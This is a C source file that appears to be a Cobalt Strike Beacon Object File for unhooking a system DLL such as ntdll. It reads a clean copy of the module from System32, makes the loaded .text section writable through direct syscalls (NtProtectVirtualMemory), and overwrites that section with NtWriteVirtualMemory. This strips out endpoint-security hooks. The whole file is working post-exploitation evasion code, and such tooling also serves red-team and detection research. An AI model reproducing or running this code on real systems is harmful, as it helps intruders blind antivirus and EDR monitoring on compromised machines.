#include <windows.h>
#include <psapi.h>
#include "beacon.h"
#include "syscalls.h"

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI PSAPI$GetModuleInformation(HANDLE, HMODULE, LPMODULEINFO, DWORD);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strcat(char * __restrict__ _Dest,const char * __restrict__ _Source);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);
WINBASEAPI BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile( HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

DECLSPEC_IMPORT HANDLE   WINAPI   KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL     WINAPI   KERNEL32$CloseHandle(HANDLE);

DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$GetEnvironmentVariableA(
  LPCSTR lpName,
  LPSTR  lpBuffer,
  DWORD  nSize
);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();



void go(char* args, int len) {
    
    CHAR *target_module;
    datap parser;
    BeaconDataParse(&parser, args, len);
    target_module = BeaconDataExtract(&parser, NULL);
    
    HANDLE process = KERNEL32$GetCurrentProcess();
	MODULEINFO mi = { 0 };

    // get systemroot
    CHAR systemRoot[250];
    KERNEL32$GetEnvironmentVariableA("SystemRoot", systemRoot, 250);

    MSVCRT$strcat(systemRoot, "\\System32\\");
    MSVCRT$strcat(systemRoot, target_module);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Removing hooks from %s", systemRoot);

    HMODULE ntdllModule = KERNEL32$GetModuleHandleA((LPCSTR)target_module);

    if (ntdllModule == INVALID_HANDLE_VALUE)
    {        
        BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to module");
        BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", KERNEL32$GetLastError());

        return;
    }

	PSAPI$GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = KERNEL32$CreateFileA((LPCSTR)systemRoot, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (ntdllFile == INVALID_HANDLE_VALUE)
    {        
        BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to file on disk");
        BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", KERNEL32$GetLastError());

        return;
    }

	HANDLE ntdllMapping = KERNEL32$CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = KERNEL32$MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] NTDLL Mapping at 0x%p", ntdllMappingAddress);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!MSVCRT$strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			ULONG oldProtection = 0;
            ULONG bytesWritten = 0;
            SIZE_T sectionSize = hookedSectionHeader->Misc.VirtualSize;
            LPVOID targetAddress = (LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress);

            BeaconPrintf(CALLBACK_OUTPUT, "[+] Target Address: 0x%p", targetAddress);
            // BOOL isProtected = KERNEL32$VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            NTSTATUS result = NtProtectVirtualMemory(NtCurrentProcess(), &targetAddress, &sectionSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            if (result != 0)
            {
                BeaconPrintf(CALLBACK_ERROR, "Failed NtProtectVirtualMemory");
                BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", result);
                return;
            }
			//MSVCRT$memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Overwriting section");

			result = NtWriteVirtualMemory(NtCurrentProcess(), (LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, &bytesWritten);
            if (result != 0)
            {
                BeaconPrintf(CALLBACK_ERROR, "Failed NtWriteVirtualMemory");
                BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", result);
                return;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "[+] Restoring section page protection");

            result = NtProtectVirtualMemory(NtCurrentProcess(),  &targetAddress, &sectionSize, PAGE_EXECUTE_READ, &oldProtection);
            if (result != 0)
            {
                BeaconPrintf(CALLBACK_ERROR, "Failed NtProtectVirtualMemory");
                BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", result);
                return;
            }
        }
	}

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Unhooking done, cleaning unused handles");
	KERNEL32$CloseHandle(process);
	KERNEL32$CloseHandle(ntdllFile);
	KERNEL32$CloseHandle(ntdllMapping);
	KERNEL32$FreeLibrary(ntdllModule);
}
